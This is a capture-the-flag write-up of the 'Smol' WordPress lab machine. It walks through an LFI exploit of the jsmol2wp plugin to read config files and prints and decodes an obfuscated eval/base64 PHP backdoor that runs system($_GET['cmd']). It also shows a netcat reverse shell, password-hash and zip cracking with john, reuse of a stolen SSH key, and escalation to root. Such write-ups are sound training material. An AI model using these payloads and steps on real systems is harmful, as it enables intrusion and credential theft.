# **Smol**

***
![image](https://github.com/user-attachments/assets/81c352ce-d7c6-4008-a29f-ebe13c6484b1)

## **Difficulty = Medium**

***



Running our nmap scan, the analyst got the following result :


```bash
# Nmap 7.95 scan initiated Sun Mar 30 18:55:49 2025 as: /usr/lib/nmap/nmap --privileged -p- -sCV -T4 -v -oN nmap.txt -Pn 10.10.111.253
Increasing send delay for 10.10.111.253 from 0 to 5 due to 852 out of 2129 dropped probes since last increase.
Increasing send delay for 10.10.111.253 from 5 to 10 due to 47 out of 117 dropped probes since last increase.
Nmap scan report for 10.10.111.253
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://www.smol.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 30 19:16:20 2025 -- 1 IP address (1 host up) scanned in 1231.05 seconds
```


Starting out the enumeration process on port 80/HTTP, the analyst is redirected back to  [http://www.smol.thm](http://www.smol.thm)

![](https://i.imgur.com/KuyYZcf.png)


The analyst decided to add this domain name to the `/etc/hosts` file, which serves as a **local DNS (Domain Name System) resolver, mapping domain names to IP addresses**



```bash
❯ sudo nano /etc/hosts
[sudo] password for sec-fortress: 

❯ head -10 /etc/hosts
--SNIP--
10.10.111.253   smol.thm www.smol.thm
--SNIP--
```


The analyst figured out the website was a wordpress site and decided to run the `wpscan` utility on this domain


- First to discover usernames which did not really yield any profit
- Second try to see if those usernames could be used to explore plugins indepthly which gave a positive result 


```bash
wpscan --url http://www.smol.thm/ -e u

wpscan --url http://www.smol.thm/ -U users.txt -P /usr/share/wordlists/rockyou.txt --password-attack wp-login
```


The analyst found a `jsmol2wp` plugin provided by the `wpscan` utility.


> **QUICK TIP!>** Whether or not a plugin is outdated it is worth checking if there are still available exploits for those plugins online, Most developers push one time project where security researchers might have found vulnerabilities for a very long time without remediation been considered on the project or even updates been pushed to the previous ones I.E _v1, v2, v3_.


![](https://i.imgur.com/YdVN9uq.png)


Searching for exploits for this plugin the analyst found one [Link Here](https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt), which is vulnerable to a LFI vulnerability as shown in the URL below


```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```



![](https://i.imgur.com/mvUItpK.png)


With this exploit the analyst was able to extract wordpress login credentials from the wordpress config file located under `wp-config.php`


```
/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
```



Login to the wordpress site there is a private file on the "**Pages**" tab that gives some list of tasks and the first task seem really important, which in summary says; "_There is a backdoor located under the **Hello Dolly** plugin file, which in turn might be out way to foothold_"



![](https://i.imgur.com/p9ibqwR.png)



Searching for the **"Hello Dolly"** path, since we have an LFI vulnerability, we can read the config file and do a code review to see where the backdoor is located at, I got the right path from a post by **_Packt_**



![](https://i.imgur.com/ywO8sKg.png)


Which boils down to the following URL, yielding the analyst profit;


```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
```


First of all we can go ahead break down the source code

- The code inside `hello.php` contained:

```php
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```

- `base64_decode(...)` decodes a **Base64-encoded** string.
- `eval(...)` then **executes the decoded PHP code**.


It is possible to decode this by decoding the base64 payload first which gives us thus;


```bash
❯ echo "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | base64 -d

 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } 
```


Then we can decode the hex in the curly braces using the `python3` utility

```bash
❯ python3
Python 3.12.6 (main, Sep  7 2024, 14:20:15) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print("\143\155\x64")
cmd
>>> print("\143\x6d\144")
cmd
>>> 
```


- Since `hello.php` relies on WordPress functions (`add_action`, `admin_notices`), then execution might require an authenticated admin visiting the WordPress dashboard. If you need more understanding we can break this down :


### **Breaking It Down**

1. **`add_action( $hook, $function )`**
    
    - This is a WordPress function that hooks a custom function (`$function`) to a specific WordPress event (`$hook`).
        
    - It ensures that `hello_dolly()` runs when `admin_notices` is executed.
        
2. **`admin_notices` Hook**
    
    - `admin_notices` is a built-in WordPress hook that displays system messages in the admin dashboard.
        
    - It runs on every admin page load.
        
3. **Effect of This Code**
    
    - Every time an admin visits any page inside the WordPress dashboard, the `hello_dolly()` function runs.
        
    - Since `hello_dolly()` contains `eval(base64_decode(...))`, the backdoor executes **whenever an admin logs into WordPress**.



![](https://i.imgur.com/1pkiFOJ.png)


Since we have credentials we can see if the `wpuser` have admin access by:

1. Log in to WordPress (`/wp-admin`).
    
2. Visit:


```
http://www.smol.thm/wp-admin/?cmd=id;hostnamectl
```
    
3. The system will execute `system("id;hostnamectl")`, revealing user and system info.



![](https://i.imgur.com/CoxmKHd.png)



As we can see the command executed successfully as shown above and with that i used the "**Upload & Execute**" method to get a reverse shell




```
❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.46.88 53336
bash: cannot set terminal process group (716): Inappropriate ioctl for device
bash: no job control in this shell
www-data@smol:/var/www/wordpress/wp-admin$ whoami
whoami
www-data
www-data@smol:/var/www/wordpress/wp-admin$ 
```


Checking `/opt` we have a wordpress SQL database backup file


```
www-data@smol:/opt$ ls
wp_backup.sql
www-data@smol:/opt$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.11.105.30 - - [31/Mar/2025 09:42:56] "GET /wp_backup.sql HTTP/1.1" 200 -
```

Downloaded it to the analyst system and opened it using the `sqlitebrowser` utility to open the file which didn't yield any profit

```
❯ wget 10.10.46.88:1337/wp_backup.sql
--2025-03-31 10:42:56--  http://10.10.46.88:1337/wp_backup.sql
Connecting to 10.10.46.88:1337... connected.
HTTP request sent, awaiting response... 200 OK
Length: 291970 (285K) [application/x-sql]
Saving to: ‘wp_backup.sql’
```


Then i decided to inspect the MySQL database to see if there are any credentials for other wordpress users


```mysql
~$ mysql -u wpuser -p

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
5 rows in set (0.00 sec)

mysql> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------------+
| Tables_in_wordpress       |
+---------------------------+
| --SNIP--                  |
| wp_users                  |
| --SNIP--                  |
+---------------------------+
42 rows in set (0.01 sec)

mysql> select * from wp_users;

```

...And finally there are `phpass`  encrypted hashes on the wordpress database


![](https://i.imgur.com/v1CwGi7.png)


With this the analyst was able to save this hashes into a text and got a hit 4 minutes into the hash cracking process on the user `diego`

```bash
❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=phpass
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:04:55 4.86% (ETA: 12:36:25) 0g/s 2709p/s 13549c/s 13549C/s scarab45..savemyself
sandiegocalifornia (?)     
1g 0:00:20:10 23.30% (ETA: 12:21:44) 0.000826g/s 2920p/s 12772c/s 12772C/s stephendavies26..stephc621
1g 0:00:20:11 23.32% (ETA: 12:21:44) 0.000825g/s 2920p/s 12769c/s 12769C/s step1213..stemi2emmy
1g 0:01:06:18 DONE (2025-03-31 12:01) 0.000251g/s 3605p/s 14752c/s 14752C/s !!!@@@!!!..*7¡Vamos!
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 

```

Switched user to `diego` with the password discovered 

```bash
www-data@smol:/tmp$ su diego
Password: 
diego@smol:/tmp$ whoami
diego
```

Checking the home folder of user `think`, the analyst found an `id_rsa` file used to login via the SSH protocol


```bash
diego@smol:/home$ cd think
diego@smol:/home/think$ ls -la
total 32
drwxr-x--- 5 think internal 4096 Jan 12  2024 .
drwxr-xr-x 6 root  root     4096 Aug 16  2023 ..
lrwxrwxrwx 1 root  root        9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 think think     220 Jun  2  2023 .bash_logout
-rw-r--r-- 1 think think    3771 Jun  2  2023 .bashrc
drwx------ 2 think think    4096 Jan 12  2024 .cache
drwx------ 3 think think    4096 Aug 18  2023 .gnupg
-rw-r--r-- 1 think think     807 Jun  2  2023 .profile
drwxr-xr-x 2 think think    4096 Jun 21  2023 .ssh
lrwxrwxrwx 1 root  root        9 Aug 18  2023 .viminfo -> /dev/null
diego@smol:/home/think$ cd .ssh
diego@smol:/home/think/.ssh$ ls -la
total 20
drwxr-xr-x 2 think think    4096 Jun 21  2023 .
drwxr-x--- 5 think internal 4096 Jan 12  2024 ..
-rwxr-xr-x 1 think think     572 Jun 21  2023 authorized_keys
-rwxr-xr-x 1 think think    2602 Jun 21  2023 id_rsa
-rwxr-xr-x 1 think think     572 Jun 21  2023 id_rsa.pub
diego@smol:/home/think/.ssh$
```


Saved the `id_rsa` file on the analyst system and granted it the right permissions which led to a shell as user `think`

```bash
❯ nano id_rsa

❯ chmod 600 id_rsa

❯ ssh think@10.10.206.34 -i id_rsa
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 31 Mar 2025 04:46:57 PM UTC

  System load:  0.0               Processes:             147
  Usage of /:   56.9% of 9.75GB   Users logged in:       0
  Memory usage: 22%               IPv4 address for ens5: 10.10.206.34
  Swap usage:   0%

think@smol:~$ whoami
think
think@smol:~$ 
```



After a while the analyst figured out a old wordpress file in the user `gege` home folder, however this file can only go through analysis either by the user `root` or by the user `gege`. After series of trouble the analyst decided to switch user to `gege`, which in shocked worked without a password.

This is probably because user `gege` has  an Empty Password set in the `/etc/shadow` file.


```bash
think@smol:/home/gege$ ls
wordpress.old.zip
think@smol:/home/gege$ pwd
/home/gege
think@smol:/home/gege$ ls -la
total 31532
drwxr-x--- 2 gege internal     4096 Aug 18  2023 .
drwxr-xr-x 6 root root         4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root            9 Aug 18  2023 .bash_history -> /dev/null
-rw-r--r-- 1 gege gege          220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 gege gege         3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 gege gege          807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root            9 Aug 18  2023 .viminfo -> /dev/null
-rwxr-x--- 1 root gege     32266546 Aug 16  2023 wordpress.old.zip
think@smol:/home/gege$ su gege
gege@smol:~$ 
```


Transferred this wordpress old file to the analyst system and used `zip2john` utility to get an hash because the file was encrypted, which gave us a password through the cracking process with `johntheripper`.


```bash
❯ zip2john wordpress.old.zip > crack.txt

❯ john crack.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hero_gege@hotmail.com (wordpress.old.zip)
1g 0:00:00:01 DONE (2025-03-31 18:55) 0.7936g/s 6052Kp/s 6052Kc/s 6052KC/s hesse..hepiboth
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

❯ unzip wordpress.old.zip
Archive:  wordpress.old.zip
   creating: wordpress.old/
[wordpress.old.zip] wordpress.old/wp-config.php password:
  inflating: wordpress.old/wp-config.php    
```

The most important file there was the `wp-config.php` config wordpress file, which gave us the user `xavi` password


```bash
❯ \cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *      
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.                     
 *
 * This file contains the following configurations:
 *
 * * Database settings                         
 * * Secret keys        
 * * Database table prefix  
 * * ABSPATH                                   
 *                                          
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */                                  

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );              

/** Database username */   
define( 'DB_USER', 'xavi' );                   

/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
```


Switching user to `xavi` with the password gotten and checking the sudo permissions available for this user we can see that the user `xavi` can run all commands on the following linux system which gave us the user root.

```bash
gege@smol:/home/think$ su xavi
Password: 
xavi@smol:/home/think$ sudo -l
[sudo] password for xavi: 
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL
xavi@smol:/home/think$ sudo su
root@smol:/home/think$ id
uid=0(root) gid=0(root) groups=0(root)
root@smol:/home/think$ hostnamectl
   Static hostname: smol
         Icon name: computer-vm
           Chassis: vm
        Machine ID: ea9eb57d598546619efbe004a3b2ecc6
           Boot ID: 406d59933ebb48478bf5350be106f538
    Virtualization: kvm
  Operating System: Ubuntu 20.04.6 LTS
            Kernel: Linux 5.4.0-156-generic
      Architecture: x86-64
```



<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>

